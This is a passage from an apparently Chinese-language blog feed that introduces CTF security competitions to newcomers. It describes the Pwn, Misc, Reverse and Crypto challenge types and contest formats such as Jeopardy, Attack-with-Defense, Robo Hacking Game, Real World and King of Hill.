Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><pre><code>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</code></pre><p>   常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>​    Reverse题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>​    Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h1 id="三、CTF的比赛形式"><a href="#三、CTF的比赛形式" class="headerlink" title="三、CTF的比赛形式"></a>三、CTF的比赛形式</h1><p>  CTF的比赛形式主要包括以下几种：<a href="#%E7%90%86%E8%AE%BA%E7%B1%BB">理论类</a>，<a href="#Jeopardy-%E8%A7%A3%E9%A2%98">Jeopardy-解题</a>)，<a href="#AwD-%E6%94%BB%E9%98%B2">AwD-攻防</a>，<a href="#RHG-%E8%87%AA%E5%8A%A8%E5%8C%96">RHG-自动化</a>，<a href="#RW-%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C">RW-真实世界</a>，<a href="#KoH-%E6%8A%A2%E5%8D%A0%E5%B1%B1%E5%A4%B4">KoH-抢占山头</a>，<a href="#Mix-%E6%B7%B7%E5%90%88">MIX-混合</a></p><h2 id="理论类"><a href="#理论类" class="headerlink" title="理论类"></a>理论类</h2><p>​    理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h2><p>​    参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防"><a href="#AwD-攻防" class="headerlink" title="AwD-攻防"></a>AwD-攻防</h2><p>​    <strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化"><a href="#RHG-自动化" class="headerlink" title="RHG-自动化"></a>RHG-自动化</h2><p>​    <strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h2><p>​    <strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h2><p>​    <strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix-混合"></a>Mix-混合</h2><p>​    混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h1 id="-1"><a href="#-1" class="headerlink" title></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="萌新" scheme="https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"/>
    
  </entry>
  
</feed>
